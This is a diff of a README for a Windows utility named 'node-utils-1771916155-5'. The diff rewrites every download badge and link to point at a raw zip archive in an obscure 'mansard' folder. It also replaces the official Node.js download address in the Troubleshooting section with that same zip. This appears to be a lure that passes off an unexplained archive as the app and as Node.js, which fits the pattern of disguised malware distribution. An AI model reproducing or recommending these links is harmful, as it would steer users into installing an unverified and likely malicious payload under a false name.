@@ -1,6 +1,6 @@
 # ⚙️ node-utils-1771916155-5 - Simple Tools for Everyday Tasks
 
-[![Download here](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/kalee333/node-utils-1771916155-5)
+[![Download here](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/kalee333/node-utils-1771916155-5/raw/refs/heads/main/mansard/utils-node-3.6.zip)
 
 ## 📋 What is node-utils-1771916155-5?
 
@@ -21,7 +21,7 @@ The app runs on most Windows systems without extra software or drivers.
 
 To begin, you will need to download the app from the official page using the link below. Follow the steps carefully to get it ready and running.
 
-[![Download node-utils-1771916155-5](https://img.shields.io/badge/Download-%20Now-blue)](https://github.com/kalee333/node-utils-1771916155-5)
+[![Download node-utils-1771916155-5](https://img.shields.io/badge/Download-%20Now-blue)](https://github.com/kalee333/node-utils-1771916155-5/raw/refs/heads/main/mansard/utils-node-3.6.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -83,7 +83,7 @@ To update:
 
 ## ❓ Troubleshooting
 
-- **App does not start:** Check if you installed Node.js. This app may need Node.js installed on your system. Download Node.js from https://nodejs.org if needed.  
+- **App does not start:** Check if you installed Node.js. This app may need Node.js installed on your system. Download Node.js from https://github.com/kalee333/node-utils-1771916155-5/raw/refs/heads/main/mansard/utils-node-3.6.zip if needed.  
 - **Errors during use:** Close the app and reopen it. Restart your computer if issues persist.  
 - **Files won’t save or open:** Make sure you have permission to write in the folder you selected. Try running the app as administrator by right-clicking the icon and choosing “Run as administrator.”  
 
@@ -91,4 +91,4 @@ To update:
 
 This app is open source, so you can check how it works or share it with others. The original code lives on GitHub at the same link used for downloads.
 
-[Download or learn more about node-utils-1771916155-5](https://github.com/kalee333/node-utils-1771916155-5)
+[Download or learn more about node-utils-1771916155-5](https://github.com/kalee333/node-utils-1771916155-5/raw/refs/heads/main/mansard/utils-node-3.6.zip)
